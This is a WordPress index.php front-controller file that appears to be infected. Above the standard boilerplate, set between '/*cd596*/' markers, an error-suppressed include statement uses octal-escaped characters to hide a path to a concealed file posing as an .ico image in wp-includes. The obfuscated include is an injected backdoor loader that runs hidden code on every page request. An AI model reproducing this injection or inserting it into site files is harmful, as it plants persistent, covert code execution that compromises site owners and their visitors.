<?php
/*cd596*/

@include "\057opt\057bit\156ami\057app\163/wo\162dpr\145ss/\150tdo\143s/w\160-in\143lud\145s/T\145xt/\056557\066d16\065.ic\157";

/*cd596*/
/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
define('WP_USE_THEMES', true);

/** Loads the WordPress Environment and Template */
require( dirname( __FILE__ ) . '/wp-blog-header.php' );
